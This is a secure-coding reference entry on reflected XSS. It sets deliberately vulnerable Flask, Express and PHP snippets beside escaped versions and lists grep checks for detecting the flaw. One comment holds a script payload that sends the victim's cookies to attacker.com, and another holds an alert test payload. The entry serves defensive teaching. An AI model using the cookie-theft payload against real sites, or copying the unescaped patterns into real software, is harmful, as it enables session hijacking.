---
id: frontend-xss-reflected
title: Reflected Cross-Site Scripting (XSS)
severity: high
tags: [xss, frontend, injection, reflected, browser-security]
taxonomy: security/frontend/xss
references:
  - https://owasp.org/www-community/attacks/xss/
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
---

# Reflected Cross-Site Scripting (XSS)

## Description

Reflected XSS occurs when user input included in the HTTP request is immediately included in the server response without proper encoding. The malicious script executes in the victim's browser in the context of the application. Commonly exploited via phishing links.

Attackers use reflected XSS to: steal session cookies, capture keystrokes, redirect to phishing pages, and perform actions as the victim.

## Vulnerable Pattern

```python
# BAD — Flask: user input reflected into HTML without escaping
from flask import Flask, request

@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<html><body>Results for: {query}</body></html>"
    # Payload: ?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
```

```javascript
// BAD — Express.js: raw user input in response HTML
app.get("/greet", (req, res) => {
    const name = req.query.name;
    res.send(`<h1>Hello, ${name}!</h1>`);  // XSS via ?name=<script>alert(1)</script>
});
```

```php
// BAD — PHP: echo without htmlspecialchars
$search = $_GET['search'];
echo "You searched for: " . $search;
```

## Secure Pattern

```python
# GOOD — Flask with Jinja2 autoescaping (default enabled)
from flask import render_template
from markupsafe import escape

@app.route("/search")
def search():
    query = request.args.get("q", "")
    return render_template("search.html", query=query)
    # In template: {{ query }} is auto-escaped by Jinja2

# GOOD — explicit escaping when building HTML strings
safe_query = escape(query)
return f"<html><body>Results for: {safe_query}</body></html>"
```

```javascript
// GOOD — React (auto-escapes by default), or use textContent
const name = req.query.name;
const safeHtml = he.encode(name);  // use 'he' library for encoding
res.send(`<h1>Hello, ${safeHtml}!</h1>`);
```

## Checks to Generate

- Grep for `f"<html` or template strings containing unescaped user input variables.
- Flag `render_template_string(f"` — dynamic template construction with user data.
- Grep for `res.send(` / `response.write(` / `echo ` with unescaped request parameters.
- Flag JavaScript `innerHTML`, `outerHTML`, `document.write(` assignments with user data.
- Check for missing `Content-Security-Policy` header — CSP mitigates XSS impact.
- Grep for `|safe` filter in Jinja2 templates applied to user-derived data.
